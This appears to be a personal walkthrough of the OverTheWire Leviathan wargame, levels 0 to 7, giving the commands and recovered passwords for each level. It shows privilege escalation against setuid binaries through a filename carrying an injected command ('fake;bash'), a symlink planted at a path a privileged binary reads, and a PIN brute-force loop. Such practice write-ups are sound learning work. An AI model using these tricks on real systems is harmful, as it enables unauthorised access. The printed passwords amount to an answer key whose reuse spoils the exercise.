lvl 0 --> lvl 1
ssh leviathan0@leviathan.labs.overthewire.org -p 2223
leviathan0
ls -a
cd .backup/
ls
cat bookmarks.html | grep -i 'password'
rioGegei8m

lvl 1 --> lvl 2
ssh leviathan1@leviathan.labs.overthewire.org -p 2223
ls
./check
ltrace ./check 
// we see this line strcmp("hel", "sex") // the password is probably sex, we obtain a bash
cat /etc/leviathan_pass/leviathan2
ougahZi8Ta

lvl 2 --> lvl 3
ssh leviathan2@leviathan.labs.overthewire.org -p 2223
ls
./printfile
./printfile /etc/passwd // it prints out the whole file
ls -l // answer : -r-sr-x--- 1 leviathan3 leviathan2 7436 Oct 29 21:17 printfile, the s means it is owned by leviathan3
// the highligt over printfile meeans that it is a setuid binary, running it allows us to benefit from the previledges that lev3 has. Previledge elevation in other words.
./printfile /etc/leviathan_pass/leviathan3 // You cant have that file...
mktemp -d
cd /tmp/tmp.Q7WF3s2Lxd
touch 'fake;bash'
// Curiously we became leviathan3@leviathan:/tmp/tmp.Q7WF3s2Lxd$
cat /etc/leviathan_pass/leviathan3
Ahdiemoo1j

lvl 3 --> lvl 4
ssh leviathan3@leviathan.labs.overthewire.org -p 2223
ls 
./level3
ls -l // it is a setuid binary
strings ./level3 | less // to see the content
ltrace ./level3 // strcmp("h0no33", "kakaka")  
// we get strcmp("kakaka\n", "snlprintf\n")  
./level3
snlprintf
cat /etc/leviathan_pass/leviathan4
vuH0coox6m

lvl 4 --> lvl 5
ssh leviathan4@leviathan.labs.overthewire.org -p 2223
ls -a
cd .trash
./bin
// Binary message, sets of height (bytes?) : 01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010
./bin | tr " " "\n" // replace every space by a new line
./bin | tr " " "\n" | while read line; do echo "$line"; done
./bin | tr " " "\n" | while read line; do echo "obase=16;ibase=2;$line" | bc; done // converts binary to hex // obase means out base and ibase means in base // so we converted from base2 (binary) to base16 (hex)
./bin | tr " " "\n" | while read line; do echo "obase=16;ibase=2;$line" | bc; done | tr -d "\n" // back to one line
./bin | tr " " "\n" | while read line; do echo "obase=16;ibase=2;$line" | bc; done | tr -d "\n" | xxd -r -p // xxd converts a hex dump back to its original binary form
Tith4cokei

lvl 5 --> lvl 6
ssh leviathan5@leviathan.labs.overthewire.org -p 2223
Tith4cokei
ls
./leviathan5 // answer : Cannot find /tmp/file.log
ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log // ln -s creates a symbolic link between two files
// like this on calling ./leviathan5, it ask for /tmp.file.log and give us /etc/leviathan_pass/leviathan6 
ls /tmp/file.log // we get a blueish /tmp/file.log
./leviathan5
UgaoFee4li

lvl 6 --> lvl 7
ssh leviathan6@leviathan.labs.overthewire.org -p 2223
UgaoFee4li
ls
./leviathan6 // answer <4 digit code>, lets brute force with a loop !
for i in {0000..9999}; do echo $i; ./leviathan6 $i; done
cat /etc/leviathan_pass/leviathan7
ahy7MaeBo9